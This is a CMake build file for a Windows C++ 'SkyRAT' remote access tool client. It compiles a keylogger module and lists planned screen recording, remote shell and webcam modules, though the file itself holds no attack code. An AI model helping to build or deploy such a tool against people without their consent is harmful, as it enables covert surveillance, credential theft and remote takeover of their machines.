# CMakeLists.txt for SkyRAT Client
cmake_minimum_required(VERSION 3.16)

project(SkyRAT_Client 
    VERSION 1.0.0
    DESCRIPTION "SkyRAT Remote Access Tool - Client"
    LANGUAGES CXX)

# Set C++ standard
set(CMAKE_CXX_STANDARD 17)
set(CMAKE_CXX_STANDARD_REQUIRED ON)

# Compiler-specific options
if(MSVC)
    add_compile_options(/W4)
else()
    add_compile_options(-Wall -Wextra -Wpedantic)
endif()

# Find required packages
find_package(PkgConfig QUIET)

# Source files
set(CORE_SOURCES
    Core/Client.cpp
    Core/ConfigManager.cpp
    Core/ConnectionManager.cpp
    Core/CommandDispatcher.cpp
)

set(MODULE_SOURCES
    Modules/ModuleManager.cpp
    # Module implementations will be added during migration:
    # Modules/Implementations/ScreenshotModule.cpp
    Modules/Implementations/KeyloggerModule.cpp
    # Modules/Implementations/ScreenRecordingModule.cpp
    # Modules/Implementations/RemoteShellModule.cpp
    # Modules/Implementations/MouseModule.cpp
    # Modules/Implementations/WebcamModule.cpp
)

set(NETWORK_SOURCES
    Network/MessageProtocol.cpp
)

set(UTILS_SOURCES
    Utils/Logger.cpp
    Utils/ThreadPool.cpp
    Utils/Utilities.cpp
)

# Create executable
add_executable(${PROJECT_NAME}
    main.cpp
    ${CORE_SOURCES}
    ${MODULE_SOURCES}
    ${NETWORK_SOURCES}
    ${UTILS_SOURCES}
)

# Include directories
target_include_directories(${PROJECT_NAME} PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/Include
)

# Windows-specific libraries and definitions
target_link_libraries(${PROJECT_NAME} PRIVATE
    ws2_32      # Winsock2
    gdiplus     # GDI+ for screenshots
    gdi32       # GDI
    ole32       # OLE
)

target_compile_definitions(${PROJECT_NAME} PRIVATE
    WIN32_LEAN_AND_MEAN
    NOMINMAX
    _WIN32_WINNT=0x0601  # Windows 7+
)

# OpenCV linking
if(OpenCV_FOUND)
    target_link_libraries(${PROJECT_NAME} PRIVATE ${OpenCV_LIBS})
    target_include_directories(${PROJECT_NAME} PRIVATE ${OpenCV_INCLUDE_DIRS})
endif()

# Copy configuration file template
configure_file(
    ${CMAKE_CURRENT_SOURCE_DIR}/config/client.conf.template
    ${CMAKE_CURRENT_BINARY_DIR}/client.conf.template
    COPYONLY
)

# Test executable (test_main.cpp)
add_executable(SkyRAT_Tests
    test_main.cpp
    ${CORE_SOURCES}
    ${MODULE_SOURCES}
    ${NETWORK_SOURCES}
    ${UTILS_SOURCES}
)

# Include directories for tests
target_include_directories(SkyRAT_Tests PRIVATE
    ${CMAKE_CURRENT_SOURCE_DIR}
    ${CMAKE_CURRENT_SOURCE_DIR}/Include
)

# Platform-specific libraries for tests
if(WIN32)
    target_link_libraries(SkyRAT_Tests PRIVATE
        ws2_32 gdiplus gdi32 ole32
    )
    target_compile_definitions(SkyRAT_Tests PRIVATE
        WIN32_LEAN_AND_MEAN NOMINMAX _WIN32_WINNT=0x0601
    )
endif()

# Installation rules
install(TARGETS ${PROJECT_NAME}
    RUNTIME DESTINATION bin
)

install(FILES config/client.conf.template
    DESTINATION etc
    RENAME client.conf
)

# Optional: Enable testing if CTest is found
if(BUILD_TESTING)
    enable_testing()
    add_test(NAME SkyRAT_Unit_Tests COMMAND SkyRAT_Tests)
endif()